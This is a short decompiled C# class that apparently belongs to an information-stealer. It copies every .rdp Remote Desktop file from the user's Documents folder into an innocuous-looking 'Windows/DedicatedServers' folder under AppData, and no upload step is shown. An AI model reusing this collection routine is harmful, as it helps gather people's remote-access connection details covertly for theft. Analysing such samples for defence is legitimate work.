using System;
using System.IO;

namespace rDr
{
	// Token: 0x02000006 RID: 6
	internal class rdp
	{
		// Token: 0x06000009 RID: 9 RVA: 0x000026CC File Offset: 0x000008CC
		public static void Rdp()
		{
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			foreach (string text in files)
			{
				bool flag = Path.GetFileName(text).EndsWith(".rdp");
				if (flag)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/DedicatedServers");
					File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/DedicatedServers/" + Path.GetFileName(text));
				}
			}
		}
	}
}
